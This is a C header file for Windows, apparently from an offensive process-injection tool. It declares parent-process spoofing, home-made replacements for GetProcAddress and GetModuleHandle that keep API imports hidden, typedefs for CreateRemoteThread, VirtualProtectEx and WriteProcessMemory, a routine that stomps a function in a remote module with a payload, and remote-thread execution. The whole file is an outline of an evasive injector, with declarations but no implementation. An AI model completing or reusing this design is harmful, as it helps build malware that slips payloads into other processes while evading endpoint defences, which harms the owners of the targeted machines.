#pragma once
#undef UNICODE
#include <windows.h>
#include <tlhelp32.h>
#include <ctype.h>
#include <stdio.h>
#include <winternl.h>

// Spoofer
BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessID);
BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);

// IAT utils
FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName);
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2);

typedef VOID (*f_WaitForSingleObject)(HANDLE, DWORD);
typedef HANDLE(*f_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(*f_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(*f_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);

// Stomper
PVOID StompRemoteFunction(IN HANDLE hProcess, IN LPCWSTR sStompModule, IN LPCSTR sStompFunction, IN PVOID pPayload, IN SIZE_T sPayloadSize);

// Execution
VOID RemoteThreadExecute(IN HANDLE hProcess, IN PVOID pAddress);